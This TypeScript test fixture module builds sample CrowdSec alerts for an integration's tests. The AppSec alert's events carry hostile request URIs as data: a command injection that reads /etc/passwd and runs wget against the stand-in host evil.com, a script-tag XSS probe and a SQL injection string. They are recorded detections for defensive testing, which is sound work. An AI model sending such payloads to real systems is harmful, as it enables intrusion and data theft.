import fs from "fs";
import path from "path";
import { JSONArray, JSONObject } from "../../../../Types/JSON";

/*
 * CROWDSEC ALERTS, AS CROWDSEC SENDS AND PRINTS THEM (#11158).
 *
 * Each is recorded from CrowdSec's own documentation or source, not made up:
 *
 *   CROWDSEC_DOCS_SSH_BF_NOTIFICATION  byte for byte, in
 *       Fixtures/CrowdSec/docs-ssh-bf-notification.json, the "full example of
 *       an Alert object list available in the go-template" on CrowdSec's
 *       notification plugins page (crowdsec-docs,
 *       versioned_docs/version-v1.8/local_api/notification_plugins/intro.md
 *       at 2b18b1b, 2026-10-28): what the http plugin's default format,
 *       {{.|toJson}}, sends for an SSH brute force.
 *   CROWDSEC_APPSEC_OUTOFBAND_ALERT  the alert of CrowdSec's AppSec "Alert
 *       Inspection" walkthrough (appsec/vpatch_crs.md, v1.7), as
 *       `cscli alerts list -o json` reads it back from LAPI (FormatOneAlert
 *       at v1.8.2: an event's time in Go's String(), a context value a JSON
 *       list, a decision with its id and the time it has left): its id,
 *       machine, uuid, times, decision, context and six events as that
 *       page's `cscli alerts inspect -d 2172` prints them. The page redacts
 *       the address ("xxx"): 203.0.113.7, a documentation address, stands
 *       in. Its scenario hash and version are not printed there, and are
 *       filled in.
 *   CROWDSEC_NOTIFICATIONS_TEST_ALERT  the generic alert
 *       `cscli notifications test` sends (cmd/crowdsec-cli/clinotifications
 *       at v1.8.2), as {{.|toJson}} writes it: empty strings of Source are
 *       left out (omitempty).
 *   CROWDSEC_MANUAL_DECISION_ALERT  the alert `cscli decisions add --ip
 *       198.51.100.23 --duration 24h` makes (clidecision/decisions.go at
 *       v1.8.2), as a profile notifies it once LAPI gave it its machine and
 *       uuid (pkg/apiserver/controllers/v1/alerts.go).
 */

export const CROWDSEC_DOCS_SSH_BF_NOTIFICATION: JSONArray = JSON.parse(
  fs.readFileSync(
    path.resolve(
      __dirname,
      "../../../Fixtures/CrowdSec/docs-ssh-bf-notification.json",
    ),
    "utf8",
  ),
) as JSONArray;

// The documented alert itself: the list's one alert.
export const CROWDSEC_DOCS_SSH_BF_ALERT: JSONObject =
  CROWDSEC_DOCS_SSH_BF_NOTIFICATION[0] as JSONObject;

function appsecEvent(data: {
  time: string;
  requestUuid: string;
  ruleIds: string;
  targetUri: string;
}): JSONObject {
  return {
    meta: [
      { key: "datasource_path", value: "appsec" },
      { key: "datasource_type", value: "appsec" },
      { key: "log_type", value: "appsec-info" },
      { key: "remediation_cmpt_ip", value: "127.0.0.1" },
      { key: "request_uuid", value: data.requestUuid },
      { key: "rule_ids", value: data.ruleIds },
      { key: "rule_name", value: "native_rule:901340" },
      { key: "service", value: "appsec" },
      { key: "source_ip", value: "203.0.113.7" },
      { key: "target_host", value: "localhost" },
      { key: "target_uri", value: data.targetUri },
    ],
    timestamp: data.time,
  };
}

export const APPSEC_RCE_URI: string =
  '/?x=A";cat+/etc/passwd;wget+http://evil.com/payload';
export const APPSEC_XSS_URI: string = '/?x=A"<script>alert(1)</script>';
export const APPSEC_SQLI_URI: string =
  '/?x=A"+OR+"1"="1"+union+select+"fooobar","foo';

export const CROWDSEC_APPSEC_OUTOFBAND_ALERT: JSONObject = {
  capacity: 0,
  created_at: "2025-08-22T09:39:51Z",
  decisions: [
    {
      duration: "3h57m38s",
      id: 19719904,
      origin: "crowdsec",
      scenario: "crowdsecurity/crowdsec-appsec-outofband",
      scope: "Ip",
      simulated: false,
      type: "ban",
      value: "203.0.113.7",
    },
  ],
  events: [
    appsecEvent({
      time: "2025-08-22 09:39:50.326505724 +0000 UTC",
      requestUuid: "331f9426-3333-420a-bffa-ab953f44e329",
      ruleIds:
        "[901340 930120 932230 932235 932115 932160 942540 949110 980170]",
      targetUri: APPSEC_RCE_URI,
    }),
    appsecEvent({
      time: "2025-08-22 09:39:50.33919196 +0000 UTC",
      requestUuid: "69c72a65-e7e5-49fa-9253-bdbe6fca52c9",
      ruleIds:
        "[901340 930120 932230 932235 932115 932160 942540 949110 980170]",
      targetUri: APPSEC_RCE_URI,
    }),
    appsecEvent({
      time: "2025-08-22 09:39:50.352001523 +0000 UTC",
      requestUuid: "b7a95a56-a88e-4c89-b23b-2d3d06759af4",
      ruleIds: "[901340 941100 941110 941160 941390 942100 949110 980170]",
      targetUri: APPSEC_XSS_URI,
    }),
    appsecEvent({
      time: "2025-08-22 09:39:50.365872595 +0000 UTC",
      requestUuid: "fbc41250-53e6-49d9-ab04-5f6ed2cc1793",
      ruleIds: "[901340 941100 941110 941160 941390 942100 949110 980170]",
      targetUri: APPSEC_XSS_URI,
    }),
    appsecEvent({
      time: "2025-08-22 09:39:50.378905387 +0000 UTC",
      requestUuid: "d59825ff-268b-42ff-8e90-9e831a7f6a6b",
      ruleIds: "[901340 942100 942190 949110 980170]",
      targetUri: APPSEC_SQLI_URI,
    }),
    appsecEvent({
      time: "2025-08-22 09:39:50.392514386 +0000 UTC",
      requestUuid: "d0dc6cab-0ef2-4e7d-9fd1-ab06091b23ea",
      ruleIds: "[901340 942100 942190 949110 980170]",
      targetUri: APPSEC_SQLI_URI,
    }),
  ],
  events_count: 6,
  id: 2172,
  kind: "crowdsec",
  labels: null,
  leakspeed: "0s",
  machine_id: "5cf8aff523424fa68e9335f28fec409aIfHabI3W9GsKHzab",
  message:
    "Ip 203.0.113.7 performed 'crowdsecurity/crowdsec-appsec-outofband' (6 events over 65.915093ms) at 2025-08-22 09:39:50.392681747 +0000 UTC",
  meta: [
    { key: "rules", value: '["native_rule:901340"]' },
    {
      key: "target_uri",
      value: JSON.stringify([APPSEC_RCE_URI, APPSEC_XSS_URI, APPSEC_SQLI_URI]),
    },
  ],
  remediation: true,
  scenario: "crowdsecurity/crowdsec-appsec-outofband",
  scenario_hash:
    "8e2a3ca4b1b3a7e61a2a3c0b4b6fa0cbe0b7f4a1d3c66e7a9f2e0d1c3b5a6f7e",
  scenario_version: "0.6",
  simulated: false,
  source: {
    ip: "203.0.113.7",
    scope: "Ip",
    value: "203.0.113.7",
  },
  start_at: "2025-08-22T09:39:50Z",
  stop_at: "2025-08-22T09:39:50Z",
  uuid: "a0ad365a-ef08-4c18-af80-20cc02625c35",
};

export const CROWDSEC_NOTIFICATIONS_TEST_ALERT: JSONObject = {
  capacity: 0,
  created_at: "2026-11-28T10:00:00Z",
  decisions: [
    {
      duration: "4h",
      origin: "cscli",
      scenario: "test alert",
      scope: "Ip",
      type: "ban",
      value: "10.10.10.10",
    },
  ],
  events: [],
  events_count: 1,
  labels: null,
  leakspeed: "0",
  message: "test alert",
  scenario: "test alert",
  scenario_hash: "",
  scenario_version: "",
  simulated: false,
  source: {
    ip: "10.10.10.10",
    scope: "Ip",
    value: "10.10.10.10",
  },
  start_at: "2026-11-28T10:00:00Z",
  stop_at: "2026-11-28T10:00:00Z",
};

export const CROWDSEC_MANUAL_DECISION_ALERT: JSONObject = {
  capacity: 0,
  created_at: "2026-11-28T09:12:00Z",
  decisions: [
    {
      duration: "24h",
      origin: "cscli",
      scenario: "manual 'ban' from 'localhost'",
      scope: "Ip",
      type: "ban",
      uuid: "1d4c1c8a-2f4e-4c55-9d0e-6f0f3c7b2a10",
      value: "198.51.100.23",
    },
  ],
  events: [],
  events_count: 1,
  kind: "cscli",
  labels: null,
  leakspeed: "0",
  machine_id: "localhost",
  message: "manual 'ban' from 'localhost'",
  remediation: true,
  scenario: "manual 'ban' from 'localhost'",
  scenario_hash: "",
  scenario_version: "",
  simulated: false,
  source: {
    ip: "198.51.100.23",
    scope: "Ip",
    value: "198.51.100.23",
  },
  start_at: "2026-11-28T09:12:00Z",
  stop_at: "2026-11-28T09:12:00Z",
  uuid: "6b0e2f53-3c43-4a0c-9a66-6f2f1d0d8f4e",
};

// A copy to change, so one test's edit never leaks into another's.
export function copyOf(alert: JSONObject): JSONObject {
  return JSON.parse(JSON.stringify(alert)) as JSONObject;
}
